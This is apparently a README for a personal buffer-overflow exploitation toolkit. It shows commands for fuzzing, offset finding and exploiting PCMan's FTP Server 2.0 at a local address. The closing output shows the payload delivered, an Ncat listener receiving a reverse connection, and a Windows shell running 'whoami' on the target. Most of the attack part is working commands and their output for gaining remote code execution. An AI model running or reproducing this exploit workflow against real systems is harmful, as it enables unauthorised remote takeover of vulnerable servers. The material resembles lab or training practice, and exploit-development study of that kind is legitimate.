# BufferOverflowToolkit
just some general purpose tools to help myself when detecting and performing buffer overflows

Ignore the code it's just PoC right now.

## Throw 100 bytes of data at the socket until it crashes, examine crash point
```
➜  exploitdev ./evilFuzzer.py 192.168.1.236 21 100
```

## Use Metasploit-Framework's pattern_create tool automagically.
```
➜  exploitdev ./evilPattern.py 192.168.1.236 21 2400
```

## Helper function to return the exact offset via pattern_offset from the instruction pointer
```
➜  exploitdev ./getOffset.py address
```

## Hunt your bad characters
TODO

## Blast your socket and get a connection back

```bash
➜  exploitdev ./evilSocket.py 192.168.1.236 21 2008 77F1E871 15
```

## End Result
```bash
[*] Connecting to 192.168.1.236...
[x] Connected to 220 PCMan's FTP Server 2.0 Ready.

[*] Sending payload...
[x] Payload delivered
[*] Waiting for target to connect
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::54321
Ncat: Listening on 0.0.0.0:54321
Ncat: Connection from 192.168.1.236.
Ncat: Connection from 192.168.1.236:50121.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\donthackmebro\Downloads>whoami
whoami
win-t72rd5qv7hv\donthackmebro
```
